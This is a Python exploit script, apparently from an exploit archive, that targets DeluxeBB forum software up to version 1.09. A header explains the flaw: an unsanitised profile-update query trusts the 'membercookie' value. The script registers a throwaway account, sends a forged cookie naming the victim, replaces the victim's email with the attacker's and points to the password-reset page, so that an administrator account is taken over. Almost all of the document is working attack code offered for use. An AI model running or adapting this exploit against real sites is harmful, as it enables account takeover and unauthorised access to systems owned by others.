<html><head><title>DeluxeBB <= 1.09 Remote Admin Email Change Exploit</title></head><pre>#!/usr/bin/python
#-*- coding: iso-8859-15 -*-
'''
 _ __   _____  _____ _ __  
| '_ \ / _ \ \/ / _ \ '_ \ 
| | | |  __/&gt;  &lt;  __/ | | |
|_| |_|\___/_/\_\___|_| |_|

------------------------------------------------------------------------------------------------
Â§ DeluxeBB 0day Remote Change Admin's credentials Â§
------------------------------------------------------------------------------------------------
nexen
------------------------------------------------------------------------------------------------
PoC / Bug Explanation: 
When you update your profile,
DeluxeBB execute a vulnerable query:

$db-&gt;unbuffered_query(&quot;UPDATE &quot;.$prefix.&quot;users SET email='$xemail', msn='$xmsn', icq='$xicq', ... WHERE (username='$membercookie')&quot;);

So, editing cookie &quot;membercookie&quot; you can change remote user's email.

Enjoy ;)
------------------------------------------------------------------------------------------------

'''


import httplib, urllib, sys, md5
from random import randint
print &quot;\n########################################################################################&quot;
print &quot;                    DeluxeBB &lt;= 1.09 Remote Admin's/User's Email Change                   &quot;
print &quot;                                                                                          &quot;
print &quot;                            Vulnerability Discovered By Nexen                             &quot;          
print &quot;                        Greetz to The:Paradox that Coded the Exploit.                     &quot;
print &quot;                                                                                          &quot;
print &quot; Usage:                                                                                   &quot; 
print &quot; %s [Target] [VictimNick] [Path] [YourEmail] [AdditionalFlags]                            &quot; % (sys.argv[0])
print &quot;                                                                                          &quot;	
print &quot; Additional Flags:                                                                        &quot;	
print &quot; -id34 -passMypassword -port80                                                            &quot;	
print &quot;                                                                                          &quot;	
print &quot; Example:                                                                                 &quot; 			
print &quot; python %s 127.0.0.1 admin /DeluxeBB/ me@it.com -port81                                   &quot; % (sys.argv[0])
print &quot;                                                                                          &quot;	
print &quot;########################################################################################\n&quot;
if len(sys.argv)&lt;=4:	sys.exit()
else:   print &quot;[.]Exploit Starting.&quot;		

target = sys.argv[1]
admin_nick = sys.argv[2]
path = sys.argv[3]
real_email = sys.argv[4]

botpass = &quot;the-new-administrator&quot;
rand = randint(1, 99999)
dn1 = 0
dn2 = 0
dn3 = 0

try:
 for line in sys.argv[:]:
	if line.find('-pass') != -1 and dn1 == 0:
		upass = line.split('-pass')[1]
		dn1 = 1
	elif line.find('-pass') == -1 and dn1 == 0:
		upass = &quot;&quot;
	if line.find('-id') != -1 and dn2 == 0:
		userid = line.split('-id')[1]
		dn2 = 1
	elif line.find('-id') == -1 and dn2 == 0:
		userid = &quot;&quot;

	if line.find('-port') != -1 and dn3 == 0:
		port = line.split('-port')[1]
		dn3 = 1
	elif line.find('-port') == -1 and dn3 == 0:
		port = &quot;80&quot;
except:
	sys.exit(&quot;[-]Some error in Additional Flag.&quot;)
if upass==&quot;&quot; and userid != &quot;&quot; or userid == &quot;&quot; and upass != &quot;&quot;: 
	print &quot;[-]Bad Additional flags -id -pass given, ignoring them.&quot; 
	upass=&quot;&quot;
	userid=&quot;&quot;
############################################################################################Trying to connect.
try: 	
	conn = httplib.HTTPConnection(target,port)
	conn.request(&quot;GET&quot;, &quot;&quot;)
except: sys.exit(&quot;[-]Cannot connect. Check Target.&quot;)
############################################################################################Registering a new user if id or upass not defined
try:
	conn = httplib.HTTPConnection(target,port)
	if upass == &quot;&quot; or userid == &quot;&quot;:
		conn.request(&quot;POST&quot;, path + &quot;misc.php?sub=register&quot;, urllib.urlencode({'submit': 'Register','name': 'th331337.%d' % (rand) , 'pass': botpass,'pass2': botpass,'email': 'root%d@yoursystemgotpowned.it' % (rand) }), {&quot;Accept&quot;: &quot;text/plain&quot;,&quot;Content-type&quot;: &quot;application/x-www-form-urlencoded&quot;})
		response = conn.getresponse()
		cookies = response.getheader('set-cookie').split(&quot;;&quot;)
		#print &quot;\n\nth331337.%d \n\nthe-new-administrator&quot; % (rand)
		print &quot;[.]Registering a new user. --&gt;&quot;,response.status, response.reason
		conn.close()
############################################################################################Getting memberid in Cookies
		for line in cookies[:]:
			if line.find('memberid') != -1:
				mid = line.split('memberid=')[1]
############################################################################################Isset like starts
		try: mid
		except NameError: sys.exit(&quot;[-]Can't Get \&quot;memberid\&quot;. Failed. Something has gone wrong. If you have not done yet, you may have to register manually and use flags -id -pass&quot;)
except AttributeError:
	sys.exit(&quot;[-]AttributeError Check your Target/path.&quot;)
############################################################################################Doing some Md5
if upass==&quot;&quot; or userid==&quot;&quot;:
	hash = md5.new()
	hash.update(botpass)
	passmd5 = hash.hexdigest()
else:
	hash = md5.new()
	hash.update(upass)
	passmd5 = hash.hexdigest()
	mid = userid
############################################################################################Updating &quot;victim&quot; email in Profile
conn = httplib.HTTPConnection(target,port)
conn.request(&quot;POST&quot;, path+&quot;cp.php?sub=settings&quot;, urllib.urlencode({'submit': 'Update','xemail': real_email}), {&quot;Accept&quot;: &quot;text/plain&quot;,&quot;Cookie&quot;: &quot;memberid=&quot;+mid+&quot;; membercookie=&quot;+admin_nick+&quot;;memberpw=&quot;+passmd5+&quot;;&quot; ,&quot;Content-type&quot;: &quot;application/x-www-form-urlencoded&quot;})
response = conn.getresponse()
print &quot;[.]Changing \&quot;&quot;+admin_nick+&quot;\&quot; Email With \&quot;&quot; + real_email + &quot;\&quot; --&gt;&quot;,response.status, response.reason
conn.close()
print &quot;[+]All Done! Email changed!!!\n\n You can reset \&quot;&quot;+admin_nick+&quot;\&quot; password here -&gt; &quot;+target+path+&quot;misc.php?sub=lostpw :D\n\n Have Fun =)\n&quot;

# milw0rm.com [2007-11-26]</pre></html>